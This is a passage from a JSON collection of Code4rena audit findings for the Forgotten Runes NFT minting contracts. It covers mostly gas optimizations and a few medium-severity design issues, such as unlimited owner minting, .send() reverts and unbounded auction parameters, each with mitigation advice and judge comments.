errors.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/177#issuecomment-1160705332):**\n > Most are valid, except:\n> > **ForgottenRunesWarriorsMinter.currentDaPrice(): > should be >=**\n> \n> Strict is cheaper since there is no opcode for non-strict comparison in evm.\n> \n> > **No need to explicitly initialize variables with default values**\n> \n> Yes, but I don't think it saves gas in for loop with optimizer enabled.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-16-use-custom-errors-instead-of-revert-strings-to-save-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4612",
      "title": "[G-15] Use `msg.sender` instead of OpenZeppelin's `_msgSender()` when meta-transactions capabilities aren't used",
      "impact": "GAS",
      "content": "\n`msg.sender` costs 2 gas (CALLER opcode).\n`_msgSender()` represents the following:\n\n```solidity\nfunction _msgSender() internal view virtual returns (address payable) {\n  return msg.sender;\n}\n```\n\nWhen no meta-transactions capabilities are used: `msg.sender` is enough.\n\nSee <https://docs.openzeppelin.com/contracts/2.x/gsn> for more information about GSN capabilities.\n\nConsider replacing `_msgSender()` with `msg.sender` here:\n\n```solidity\nForgottenRunesWarriorsGuild.sol:101:        require(_msgSender() == minter, 'Not a minter');\nForgottenRunesWarriorsGuild.sol:115:            _isApprovedOrOwner(_msgSender(), tokenId),\n```\n\nIn the solution, `msg.sender` is used everywhere else:\n\n```solidity\nForgottenRunesWarriorsGuild.sol:164:        require(payable(msg.sender).send(address(this).balance));\nForgottenRunesWarriorsGuild.sol:174:        require(address(msg.sender) != address(0));\nForgottenRunesWarriorsGuild.sol:175:        token.transfer(msg.sender, amount);\nForgottenRunesWarriorsMinter.sol:113:        setVaultAddress(msg.sender);\nForgottenRunesWarriorsMinter.sol:151:        daMinters.push(msg.sender);\nForgottenRunesWarriorsMinter.sol:152:        daAmountPaid[msg.sender] += msg.value;\nForgottenRunesWarriorsMinter.sol:153:        daNumMinted[msg.sender] += numWarriors;\nForgottenRunesWarriorsMinter.sol:163:            _mint(msg.sender);\nForgottenRunesWarriorsMinter.sol:182:        require(mintlistMinted[msg.sender] == false, 'Already minted');\nForgottenRunesWarriorsMinter.sol:183:        mintlistMinted[msg.sender] = true;\nForgottenRunesWarriorsMinter.sol:186:        bytes32 node = keccak256(abi.encodePacked(msg.sender));\nForgottenRunesWarriorsMinter.sol:194:        _mint(msg.sender);\nForgottenRunesWarriorsMinter.sol:221:            _mint(msg.sender);\nForgottenRunesWarriorsMinter.sol:238:        require(claimlistMinted[msg.sender] == false, 'Already claimed');\nForgottenRunesWarriorsMinter.sol:239:        claimlistMinted[msg.sender] = true;\nForgottenRunesWarriorsMinter.sol:242:        bytes32 node = keccak256(abi.encodePacked(msg.sender));\nForgottenRunesWarriorsMinter.sol:249:        _mint(msg.sender);\nForgottenRunesWarriorsMinter.sol:373:        _refundAddress(msg.sender);\nForgottenRunesWarriorsMinter.sol:628:        require(address(msg.sender) != address(0));\nForgottenRunesWarriorsMinter.sol:629:        token.transfer(msg.sender, amount);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-15-use-msgsender-instead-of-openzeppelins-_msgsender-when-meta-transactions-capabilities-arent-used",
      "tags": [],
      "finders": []
    },
    {
      "id": "4611",
      "title": "[G-14] Upgrade pragma to at least 0.8.4",
      "impact": "GAS",
      "content": "\nUsing newer compiler versions and the optimizer give gas optimizations. Also, additional safety checks are available for free.\n\nThe advantages here are:\n\n*   **Low level inliner** (>= 0.8.2): Cheaper runtime gas (especially relevant when the contract has small functions).\n*   **Optimizer improvements in packed structs** (>= 0.8.3)\n*   **Custom errors** (>= 0.8.4): cheaper deployment cost and runtime cost. *Note*: the runtime cost is only relevant when the revert condition is met. In short, replace revert strings by custom errors.\n\nConsider upgrading pragma to at least 0.8.4:\n\n```jsx\nForgottenRunesWarriorsGuild.sol:1:pragma solidity ^0.8.0;\nForgottenRunesWarriorsMinter.sol:1:pragma solidity ^0.8.0;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-14-upgrade-pragma-to-at-least-084",
      "tags": [],
      "finders": []
    },
    {
      "id": "4610",
      "title": "[G-13] No need to explicitly initialize variables with default values",
      "impact": "GAS",
      "content": "\nIf a variable is not set/initialized, it is assumed to have the default value (`0` for `uint`, `false` for `bool`, `address(0)` for address...). Explicitly initializing it with its default value is an anti-pattern and wastes gas.\n\nAs an example: `for (uint256 i = 0; i < numIterations; ++i) {` should be replaced with `for (uint256 i; i < numIterations; ++i) {`\n\nInstances include:\n\n```solidity\nForgottenRunesWarriorsGuild.sol:24:    uint256 public numMinted = 0;\nForgottenRunesWarriorsMinter.sol:162:        for (uint256 i = 0; i < numWarriors; i++) {\nForgottenRunesWarriorsMinter.sol:220:        for (uint256 i = 0; i < numWarriors; i++) {\nForgottenRunesWarriorsMinter.sol:259:        for (uint256 i = 0; i < count; i++) {\n```\n\nI suggest removing explicit initializations for default values.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-13-no-need-to-explicitly-initialize-variables-with-default-values",
      "tags": [],
      "finders": []
    },
    {
      "id": "4609",
      "title": "[G-12] Public functions to external",
      "impact": "GAS",
      "content": "\nThe following functions could be set external to save gas and improve code quality.\nExternal call cost is less expensive than of public functions.\n\n```solidity\ninitialize(address) should be declared external:\n - ForgottenRunesWarriorsGuild.initialize(address) (contracts/ForgottenRunesWarriorsGuild.sol#52-54)\nexists(uint256) should be declared external:\n - ForgottenRunesWarriorsGuild.exists(uint256) (contracts/ForgottenRunesWarriorsGuild.sol#85-87)\nsetProvenanceHash(string) should be declared external:\n - ForgottenRunesWarriorsGuild.setProvenanceHash(string) (contracts/ForgottenRunesWarriorsGuild.sol#145-147)\nwithdrawAll() should be declared external:\n - ForgottenRunesWarriorsGuild.withdrawAll() (contracts/ForgottenRunesWarriorsGuild.sol#163-165)\nforwardERC20s(IERC20,uint256) should be declared external:\n - ForgottenRunesWarriorsGuild.forwardERC20s(IERC20,uint256) (contracts/ForgottenRunesWarriorsGuild.sol#173-176)\nnumDaMinters() should be declared external:\n - ForgottenRunesWarriorsMinter.numDaMinters() (contracts/ForgottenRunesWarriorsMinter.sol#337-339)\nissueRefunds(uint256,uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.issueRefunds(uint256,uint256) (contracts/ForgottenRunesWarriorsMinter.sol#350-358)\nrefundAddress(address) should be declared external:\n - ForgottenRunesWarriorsMinter.refundAddress(address) (contracts/ForgottenRunesWarriorsMinter.sol#364-366)\nselfRefund() should be declared external:\n - ForgottenRunesWarriorsMinter.selfRefund() (contracts/ForgottenRunesWarriorsMinter.sol#371-374)\npause() should be declared external:\n - ForgottenRunesWarriorsMinter.pause() (contracts/ForgottenRunesWarriorsMinter.sol#427-429)\nunpause() should be declared external:\n - ForgottenRunesWarriorsMinter.unpause() (contracts/ForgottenRunesWarriorsMinter.sol#434-436)\nsetSelfRefundsStartTime(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setSelfRefundsStartTime(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#469-471)\nsetPhaseTimes(uint256,uint256,uint256,uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setPhaseTimes(uint256,uint256,uint256,uint256) (contracts/ForgottenRunesWarriorsMinter.sol#480-500)\nsetMintlist1MerkleRoot(bytes32) should be declared external:\n - ForgottenRunesWarriorsMinter.setMintlist1MerkleRoot(bytes32) (contracts/ForgottenRunesWarriorsMinter.sol#505-507)\nsetMintlist2MerkleRoot(bytes32) should be declared external:\n - ForgottenRunesWarriorsMinter.setMintlist2MerkleRoot(bytes32) (contracts/ForgottenRunesWarriorsMinter.sol#513-515)\nsetClaimlistMerkleRoot(bytes32) should be declared external:\n - ForgottenRunesWarriorsMinter.setClaimlistMerkleRoot(bytes32) (contracts/ForgottenRunesWarriorsMinter.sol#520-522)\nsetStartPrice(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setStartPrice(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#550-552)\nsetLowestPrice(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setLowestPrice(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#557-559)\nsetDaPriceCurveLength(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setDaPriceCurveLength(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#564-566)\nsetDaDropInterval(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setDaDropInterval(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#571-573)\nsetFinalPrice(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setFinalPrice(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#579-581)\nsetMaxDaSupply(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setMaxDaSupply(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#586-588)\nsetMaxForSale(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setMaxForSale(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#593-595)\nsetMaxForClaim(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.setMaxForClaim(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#600-602)\nwithdraw(uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.withdraw(uint256) (contracts/ForgottenRunesWarriorsMinter.sol#608-611)\nwithdrawAll() should be declared external:\n - ForgottenRunesWarriorsMinter.withdrawAll() (contracts/ForgottenRunesWarriorsMinter.sol#616-619)\nforwardERC20s(IERC20,uint256) should be declared external:\n - ForgottenRunesWarriorsMinter.forwardERC20s(IERC20,uint256) (contracts/ForgottenRunesWarriorsMinter.sol#627-630)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-12-public-functions-to-external",
      "tags": [],
      "finders": []
    },
    {
      "id": "4608",
      "title": "[G-11] Increments can be unchecked",
      "impact": "GAS",
      "content": "\nIn Solidity 0.8+, there's a default overflow check on unsigned integers. It's possible to uncheck this in for-loops and save some gas at each iteration, but at the cost of some code readability, as this uncheck cannot be made inline.\n\n[ethereum/solidity#10695](https://github.com/ethereum/solidity/issues/10695)\n\nInstances include:\n\n```solidity\nForgottenRunesWarriorsMinter.sol:162:        for (uint256 i = 0; i < numWarriors; i++) {\nForgottenRunesWarriorsMinter.sol:220:        for (uint256 i = 0; i < numWarriors; i++) {\nForgottenRunesWarriorsMinter.sol:259:        for (uint256 i = 0; i < count; i++) {\nForgottenRunesWarriorsMinter.sol:355:        for (uint256 i = startIdx; i < endIdx + 1; i++) {\n```\n\nThe code would go from:\n\n```solidity\nfor (uint256 i; i < numIterations; i++) {  \n // ...  \n}  \n```\n\nto:\n\n```solidity\nfor (uint256 i; i < numIterations;) {  \n // ...  \n unchecked { ++i; }  \n}  \n```\n\nThe risk of overflow is inexistant for a `uint256` here.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-11-increments-can-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "4606",
      "title": "[G-09] Splitting `require()` statements that use `&&` saves gas",
      "impact": "GAS",
      "content": "\nIf you're using the Optimizer at 200, instead of using the `&&` operator in a single require statement to check multiple conditions, I suggest using multiple require statements with 1 condition per require statement:\n\n```solidity\ncontracts/ForgottenRunesWarriorsMinter.sol:\n  140          require(\n  141:             numWarriors > 0 && numWarriors <= 20,\n  142              'You can summon no more than 20 Warriors at a time'\n  143          );\n\n  210          require(\n  211:             numWarriors > 0 && numWarriors <= 20,\n  212              'You can summon no more than 20 Warriors at a time'\n  213          );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-09-splitting-require-statements-that-use--saves-gas",
      "tags": [],
      "finders": []
    },
    {
      "id": "4603",
      "title": "[G-06] Boolean comparisons",
      "impact": "GAS",
      "content": "\nComparing to a constant (`true` or `false`) is a bit more expensive than directly checking the returned boolean value.\nI suggest using `if(!directValue)` instead of `if(directValue == false)` here:\n\n```solidity\nForgottenRunesWarriorsMinter.sol:182:        require(mintlistMinted[msg.sender] == false, 'Already minted');\nForgottenRunesWarriorsMinter.sol:238:        require(claimlistMinted[msg.sender] == false, 'Already claimed');\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-06-boolean-comparisons",
      "tags": [],
      "finders": []
    },
    {
      "id": "4600",
      "title": "[G-03] Unnecessary `initialize()` function",
      "impact": "GAS",
      "content": "\nThe `initialize()` function isn't an initializer. It just calls `setMinter()`, which has the same visibility and authorization level as `initialize()`:\n\n```solidity\nFile: ForgottenRunesWarriorsGuild.sol\n52:     function initialize(address newMinter) public onlyOwner { \n53:         setMinter(newMinter);\n54:     }\n...\n137:     function setMinter(address newMinter) public onlyOwner {\n138:         minter = newMinter;\n139:     }\n```\n\nIt could even be called repeatedly.\n\nAs the `initialize()` function is not needed, I suggest deleting it and directly calling `setMinter()` to \"Conveniently initialize the contract\".\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-03-unnecessary-initialize-function",
      "tags": [],
      "finders": []
    },
    {
      "id": "4599",
      "title": "[G-02] Unchecking arithmetics operations that can't underflow/overflow",
      "impact": "GAS",
      "content": "\nSolidity version 0.8+ comes with implicit overflow and underflow checks on unsigned integers. When an overflow or an underflow isn't possible (as an example, when a comparison is made before the arithmetic operation), some gas can be saved by using an `unchecked` block: <https://docs.soliditylang.org/en/v0.8.10/control-structures.html#checked-or-unchecked-arithmetic>\n\nI suggest wrapping L295 with an `unchecked` block (see `@audit`):\n\n```solidity\nFile: ForgottenRunesWarriorsMinter.sol\n291:         // don't go negative in the next step\n292:         if (stepDeduction > startPrice) {\n293:             return lowestPrice;\n294:         }\n295:         uint256 currentPrice = startPrice - stepDeduction; //@audit gas: should be unchecked due to L292-L293\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-02-unchecking-arithmetics-operations-that-cant-underflowoverflow",
      "tags": [],
      "finders": []
    },
    {
      "id": "4598",
      "title": "[G-01] Caching storage values in memory",
      "impact": "GAS",
      "content": "\nThe code can be optimized by minimising the number of SLOADs. SLOADs are expensive (100 gas) compared to MLOADs/MSTOREs (3 gas). Here, storage values should get cached in memory (see the `@audit` tags for further details):\n\n```solidity\ncontracts/ForgottenRunesWarriorsGuild.sol:\n  100:         require(numMinted < MAX_WARRIORS, 'All warriors have been summoned');  //@audit gas: numMinted SLOAD 1 (should declare tokenId earlier and use it instead)\n  102:         uint256 tokenId = numMinted; //@audit gas: numMinted SLOAD 2 (should be declared earlier)\n  104:         numMinted += 1;  //@audit gas: numMinted SLOAD 3 (should be numMinted = tokenId + 1)\n\ncontracts/ForgottenRunesWarriorsMinter.sol:\n  136:         require(numSold < maxDaSupply, 'Auction sold out'); //@audit gas: numSold SLOAD 1, maxDaSupply SLOAD 1\n  137:         require(numSold + numWarriors <= maxDaSupply, 'Not enough remaining'); //@audit gas: numSold SLOAD 2, maxDaSupply SLOAD 2\n  154:         numSold += numWarriors; //@audit gas: numSold SLOAD 3 (equivalent to numSold = numSold + numWarriors)\n  156:         if (numSold == maxDaSupply) { //@audit gas: numSold SLOAD 4, maxDaSupply SLOAD 3\n  177:         require(numSold < maxForSale, 'Sold out'); //@audit gas: numSold SLOAD 1\n  193:         numSold += 1; //@audit gas: numSold SLOAD 2 (equivalent to numSold = numSold + 1)\n  207:         require(numSold < maxForSale, 'Sold out'); //@audit gas: numSold SLOAD 1, maxDaSupply SLOAD 1\n  208:         require(numSold + numWarriors <= maxForSale, 'Not enough remaining'); //@audit gas: numSold SLOAD 2, maxDaSupply SLOAD 2\n  219:         numSold += numWarriors; //@audit gas: numSold SLOAD 3 (equivalent to numSold = numSold + numWarriors)\n  234:         require(numClaimed < maxForClaim, 'No more claims'); //@audit gas: numSold SLOAD 1\n  248:         numClaimed += 1; //@audit gas: numSold SLOAD 2 (equivalent to numSold = numSold + 1)\n  279:         if (block.timestamp >= daStartTime + daPriceCurveLength) {//@audit gas: daStartTime SLOAD 1, daPriceCurveLength SLOAD 1\n  284:         uint256 dropPerStep = (startPrice - lowestPrice) / //@audit gas: startPrice SLOAD 1, lowestPrice SLOAD 1\n  285:             (daPriceCurveLength / daDropInterval); //@audit gas: daPriceCurveLength SLOAD 2, daDropInterval SLOAD 1\n  287:         uint256 elapsed = block.timestamp - daStartTime;//@audit gas: daStartTime SLOAD 2\n  288:         uint256 steps = elapsed / daDropInterval; //@audit gas: daDropInterval SLOAD 2\n  292:         if (stepDeduction > startPrice) { //@audit gas: startPrice SLOAD 2\n  293:             return lowestPrice; //@audit gas: lowestPrice SLOAD 2\n  295:         uint256 currentPrice = startPrice - stepDeduction; //@audit gas: startPrice SLOAD 3\n  296:         return currentPrice > lowestPrice ? currentPrice : lowestPrice;  //@audit gas: lowestPrice SLOAD 2 & 3\n  401:             IWETH(weth).deposit{value: amount}(); //@audit gas: weth SLOAD 1\n  402:             IERC20(weth).transfer(to, amount); //@audit gas: weth SLOAD 2\n  609:         require(address(vault) != address(0), 'no vault'); //@audit gas: vault SLOAD 1\n  610:         require(payable(vault).send(_amount)); //@audit gas: vault SLOAD 2\n  617:         require(address(vault) != address(0), 'no vault'); //@audit gas: vault SLOAD 1\n  618:         require(payable(vault).send(address(this).balance)); //@audit gas: vault SLOAD 2\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "#g-01-caching-storage-values-in-memory",
      "tags": [],
      "finders": []
    },
    {
      "id": "2197",
      "title": "[M-06] The owner can mint all of the NFTs.",
      "impact": "MEDIUM",
      "content": "\n[ForgottenRunesWarriorsMinter.sol#L257](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L257)<br>\n\nIn ForgottenRunesWarriorsMinter.teamSummon() the owner can mint unrestricted amount of NFTs. This is more of a design issue than an actual bug in my opinion.\n\n### Proof of Concept\n\nIf the private keys were compromised during the launch the attacker could mint almost all of the NFTs. Normally I wouldn't say this is an issue but from your documentation, I understand that you are not planning to use a multi-sig wallet for the owner of the contracts. I definitely don't want to say that you are incompetent and you can't store your private keys safely but private keys are getting compromised very often in this space.\n\n### Recommended Mitigation Steps\n\nLimit how many NFTs can the owner mint. So even if the private keys were compromised the attacker couldn't destroy the entire set by minting thousands of the NFTs to himself making the entire set worth nothing.\n\nI also think this will help with the trust of the protocol since the buyers will know exactly how many NFTs can the Dev Team mint for themselves.\n\n**[cryppadotta (Forgotten Runes) acknowledged and commented](https://github.com/code-423n4/2022-05-runes-findings/issues/104#issuecomment-1118089191):**\n > This is true, but by design. It's a risk for minters, but it would be obvious, so we're economically disincentivized to do this. Acknowledged, but not changing it.\n\n**[gzeon (judge) marked as Invalid and commented](https://github.com/code-423n4/2022-05-runes-findings/issues/104#issuecomment-1159522220):**\n > Sponsor acknowledged centralization risk in README.\n\n**[dmitriia (warden) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/104#issuecomment-1159581039):**\n > Centralization risk in general is one thing, the ability for unlimited mint, which is easily fixable, is another.\n> \n> A kind of a boundary state here in my opinion, having 'acknowledged' and 'invalid' flags in the same time poses some contradiction.\n\n**[gzeon (judge) reassessed as Medium severity and commented](https://github.com/code-423n4/2022-05-runes-findings/issues/104#issuecomment-1159762761):**\n > Judging this as Med Risk since there are specified amounts of teamSummon in the doc\n> > Forgotten Council DAO Creators Fund (teamSummon): ~333<br>\n> Team & Partners (teamSummon): ~325<br>\n> Community Honoraries and Contests (teamSummon): ~50<br>\n> \n> which is not enforced in the `teamSummon` function.\n\n\n\n***\n\n",
      "summary": "\nThe bug report concerns the ForgottenRunesWarriorsMinter.sol contract, specifically the teamSummon() function. The bug is a design issue that allows the owner to mint an unrestricted amount of non-fungible tokens (NFTs). If the private keys of the owner were compromised, an attacker would be able to mint a large amount of NFTs, which would make the entire set worthless. The bug was discovered during a manual review.\n\nTo mitigate the bug, the owner should limit how many NFTs can be minted. This will help to protect the set from being destroyed by an attacker, and also increase trust in the protocol since buyers will know how many NFTs the Dev Team can mint for themselves.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "https://github.com/code-423n4/2022-05-runes-findings/issues/104",
      "tags": [],
      "finders": [
        "BowTiedWardens",
        "Dinddle",
        "Kulk0",
        "0xDjango",
        "Ruhum",
        "throttle",
        "broccolirob",
        "hyh",
        "dirk_y",
        "0x1f8b",
        "unforgiven",
        "rajatbeladiya",
        "defsec"
      ]
    },
    {
      "id": "2196",
      "title": "[M-05] Use of `.send()` May Revert if The Recipient's Fallback Function Consumes More Than 2300 Gas",
      "impact": "MEDIUM",
      "content": "_Submitted by leastwood, also found by 0xliumin, berndartmueller, cccz, Czar102, gzeon, hickuphh3, horsefacts, ilan, IllIllI, joestakey, m9800, p4st13r4, peritoflores, reassor, rfa, robee, sorrynotsorry, tintin, TrungOre, VAD37, WatchPug, and z3s_\n\n[ForgottenRunesWarriorsMinter.sol#L610](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L610)<br>\n[ForgottenRunesWarriorsMinter.sol#L618](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L618)<br>\n[ForgottenRunesWarriorsGuild.sol#L164](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsGuild.sol#L164)<br>\n\nThe `.send()` function intends to transfer an ETH amount with a fixed amount of 2300 gas. This function is not equipped to handle changes in the underlying `.send()` and `.transfer()` functions which may supply different amounts of gas in the future. Additionally, if the recipient implements a fallback function containing some sort of logic, this may inevitably revert, meaning the vault and owner of the contract will never be able to call certain sensitive functions.\n\n### Recommended Mitigation Steps\n\nConsider using `.call()` instead with the checks-effects-interactions pattern implemented correctly. Careful consideration needs to be made to prevent reentrancy.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/254#issuecomment-1159542053):**\n > Determined the stake is high here and therefore Medium Risk.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about two functions, `.send()` and `.transfer()`, which are intended to transfer an ETH amount with a fixed amount of 2300 gas. However, these functions may not be equipped to handle changes in the underlying functions which may supply different amounts of gas in the future. This could lead to a situation where the recipient implements a fallback function containing some sort of logic, which may eventually revert, meaning the vault and owner of the contract will never be able to call certain sensitive functions.\n\nThe recommended mitigation step is to use `.call()` instead with the checks-effects-interactions pattern implemented correctly. Careful consideration needs to be made to prevent reentrancy.",
      "quality_score": 3,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "https://github.com/code-423n4/2022-05-runes-findings/issues/254",
      "tags": [
        "send vs call"
      ],
      "finders": [
        "Czar102",
        "berndartmueller",
        "m9800",
        "joestakey",
        "peritoflores",
        "z3s",
        "p4st13r4",
        "VAD37",
        "IllIllI",
        "reassor",
        "tintin",
        "cccz",
        "sorrynotsorry",
        "hickuphh3",
        "leastwood",
        "WatchPug",
        "horsefacts",
        "0xliumin",
        "TrungOre",
        "rfa",
        "robee",
        "ilan",
        "gzeon"
      ]
    },
    {
      "id": "2195",
      "title": "[M-04] Many unbounded and under-constrained variables in the system can lead to unfair price or DoS",
      "impact": "MEDIUM",
      "content": "_Submitted by throttle, also found by 0xDjango, BowTiedWardens, defsec, dipp, fatherOfBlocks, gzeon, hake, reassor, shung, unforgiven, and WatchPug_\n\nUnbounded and under-constrained variables.\n\n#### Proof of Concept\n\n1.  `dsStartTime` | `daPriceCurveLength` | `daDropInterval`\n\nThe team can change the above variables during sale. It will either increase or decrease the price of an NFT. Or it can make `currentDaPrice()` revert.\n\n```javascript\nuint256 dropPerStep = (startPrice - lowestPrice) / (daPriceCurveLength / daDropInterval);\n\nuint256 elapsed = block.timestamp - daStartTime;\nuint256 steps = elapsed / daDropInterval;\nuint256 stepDeduction = steps * dropPerStep;\n\n// don't go negative in the next step\nif (stepDeduction > startPrice) {\n    return lowestPrice;\n}\nuint256 currentPrice = startPrice - stepDeduction;\n```\n\n[ForgottenRunesWarriorsMinter.sol#L275-L297](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L275-L297)<br>\n\n2.  `dsStartTime` | `mintlistStartTime` | `publicStartTime` | `claimsStartTime`  `selfRefundsStartTime`\n\nThe team can change the above variables. It can result in the wrong sale phases order. For example, the public sale can end up being before every other phase due to accidentally setting it to 0.\n\n### Recommended Mitigation Steps\n\nPossible mitigation:\n\n1.  Bound and constrain variables.<br>\nFor example, daDropInterval should be less than daPriceCurveLength<br>\nAnother example: The total sum of each supply phase should not be bigger than `MAX_SUPPLY` in the NFT smart contract.\n\n**[wagmiwiz (Forgotten Runes) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/27#issuecomment-1118375680):**\n > This is true but is a low operational risk and can be undone.\n\n**[gzeon (judge) commented](https://github.com/code-423n4/2022-05-runes-findings/issues/27#issuecomment-1159534380):**\n > Decided to consolidate all issues regarding missing validation of the listed variables here (M-04).\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the unbounded and under-constrained variables in the code of a smart contract. The variables `dsStartTime`, `daPriceCurveLength`, `daDropInterval`, `mintlistStartTime`, `publicStartTime`, `claimsStartTime` and `selfRefundsStartTime` can be changed by the team during the sale, which can lead to wrong sale phases order or increase or decrease the price of an NFT. The impact of this vulnerability is that it can cause the `currentDaPrice()` to revert. For mitigation, it is recommended to bound and constrain the variables. For example, the `daDropInterval` should be less than the `daPriceCurveLength` and the total sum of each supply phase should not be bigger than the `MAX_SUPPLY` in the NFT smart contract. The tools used for this bug report was manual review.",
      "quality_score": 1.9953955244497652,
      "rarity_score": 1.0092089511004696,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Forgotten Runes",
      "source_link": "https://code4rena.com/reports/2022-05-runes",
      "github_link": "https://github.com/code-423n4/2022-05-runes-findings/issues/27",
      "tags": [
        "Validation"
      ],
      "finders": [
        "hake",
        "reassor",
        "unforgiven",
        "BowTiedWardens",
        "0xDjango",
        "throttle",
        "fatherOfBlocks",
        "WatchPug",
        "gzeon",
        "dipp",
        "shung",
        "defsec"
      ]
    },
    {
      "id": "2194",
      "title": "[M-03] Critical variables shouldn't be changed after they are set",
      "impact": "MEDIUM",
      "content": "_Submitted by pedroais, also found by AuditsAreUS, BowTiedWardens, defsec, GimelSec, gzeon, IllIllI, leastwood, and WatchPug_\n\n[ForgottenRunesWarriorsMinter.sol#L564](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L564)<br>\n[ForgottenRunesWarriorsMinter.sol#L571](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L571)<br>\n[ForgottenRunesWarriorsMinter.sol#L557](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L557)<br>\n[ForgottenRunesWarriorsMinter.sol#L571](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L571)<br>\n\nThe price for the dutch auction could be altered.\n\n### Proof of Concept\n\nI previously sent an issue about start time being settable more than once. This also happens for many other variables. Since they are many I will send them all in a single issue.\n\nThe following functions should only be called once to ensure trustlessness and integrity of the dutch auction:<br>\nsetDaPriceCurveLength<br>\nsetStartPrice<br>\nsetLowestPrice<br>\nsetDaDropInterval<br>\n\nThe price in the dutch auction is computed by this formula:<br>\nuint256 dropPerStep = (startPrice - lowestPrice) /<br>\n(daPriceCurveLength / daDropInterval);<br>\n\nBy making dapriceCurveLength or daDropInterval equal to 0 the owner could stop the auction. This could 